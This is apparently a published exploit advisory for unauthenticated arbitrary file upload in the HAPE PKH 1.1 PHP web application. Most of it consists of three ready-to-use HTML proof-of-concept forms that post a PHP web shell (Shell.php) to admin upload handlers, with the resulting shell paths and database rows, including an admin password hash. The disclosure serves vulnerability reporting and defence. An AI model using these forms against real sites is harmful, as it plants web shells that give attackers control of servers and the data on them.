# Exploit Author: Ihsan Sencan
# Vendor Homepage: http://www.sitejo.id
# Software Link: https://sourceforge.net/projects/hape-pkh/files/latest/download
# Version: 1.1 
# Category: Webapps
# Tested on: WiN7_x64/KaLiLinuX_x64
# CVE: N/A
 
# POC: 
# 1)
# File => Shell.php
# Upload Path => http://localhost/[PATH]/gambar-konten/9Shell.php
# 
# $foto_ksm = array(
#  array(&#039;id_foto&#039; => &#039;7&#039;,&#039;id_pengurus&#039; => &#039;&#039;,&#039;foto&#039; => &#039;9Shell.php&#039;,&#039;kategori_foto&#039; => &#039;Foto Profile&#039;,&#039;hari&#039; => &#039;Kamis&#039;,
# &#039;tgl&#039; => &#039;2018-10-12&#039;,&#039;jam&#039; => &#039;01:58:48&#039;));
 
<form method="POST" action="http://localhost/hape-pkh/admin/modul/mod_pengurus/aksi_foto.php?module=pengurus&act=input" enctype="multipart/form-data">
<input name="id_art" type="hidden">
<input name="id_pengurus" value="" type="hidden">
<input name="fupload" size="30" accept="image/*" type="file">
<input name="kategori_foto" value="Foto Profile" checked="" type="radio">
<input name="kategori_foto" value="Depan" type="radio">
<input name="kategori_foto" value="Belakang" type="radio">
<input name="kategori_foto" value="Samping" type="radio">
<input name="kategori_foto" value="Dalam" type="radio">
<input class="button" value="Kembali" onclick="window.location.href=&#039;?module=pengurus&act=editpengurus&id=&#039;;" type="button">
<input class="button" value="Upload" type="submit">
</form>
 
# 2)
# File => Shell.php
# Upload Path => http://localhost/hape-pkh/gambar-konten/14Shell.php
# 
# $admin = array(
#  array(&#039;id_user&#039; => &#039;1&#039;,&#039;nama_lengkap&#039; => &#039;&#039;,&#039;jk&#039; => &#039;&#039;,&#039;tempat&#039; => &#039;&#039;,&#039;tl&#039; => &#039;0000-00-00&#039;,&#039;alamat&#039; => &#039;&#039;,
# &#039;id_desa&#039; => &#039;&#039;,&#039;no_telp&#039; => &#039;&#039;,&#039;email&#039; => &#039;&#039;,&#039;username&#039; => &#039;admin&#039;,
# &#039;password&#039; => &#039;21232f297a57a5a743894a0e4a801fc3&#039;,&#039;level&#039; => &#039;admin&#039;,
# &#039;blokir&#039; => &#039;&#039;,&#039;foto&#039; => &#039;14Shell.php&#039;));
 
<form method="POST" enctype="multipart/form-data" action="http://localhost/hape-pkh/admin/modul/mod_user/aksi_user.php?module=user&act=update">
<input name="id_user" value="1" type="hidden">
<input name="username" value="admin" disabled=""> 
<input name="fupload" size="30" type="file">
<input value="Update" type="submit">
</form>
 
# 3)
# File => Shell.php
# Upload Path => http://localhost/hape-pkh/gambar-konten/Shell.php
# 
# $kecamatan = array(array(&#039;id_kecamatan&#039; => &#039;1&#039;,&#039;kecamatan&#039; => &#039;&#039;,&#039;alamat&#039; => &#039;&#039;,
# &#039;email&#039; => &#039;&#039;,&#039;telp&#039; => &#039;&#039;,&#039;kab&#039; => &#039;&#039;,&#039;provinsi&#039; => &#039;&#039;,&#039;kodepos&#039; => &#039;&#039;,
# &#039;ket&#039; => &#039;&#039;,&#039;foto&#039; => &#039;Shell.php&#039;));
 
<form method="POST" enctype="multipart/form-data" action="http://localhost/hape-pkh/admin/modul/mod_kecamatan/aksi_kecamatan.php?module=kecamatan&act=update">
<input name="id" value="1" type="hidden">
<input class="input" name="fupload" size="30" accept="image/*" type="file">
<input class="button" value="Update" type="submit"></td></tr>
</form>

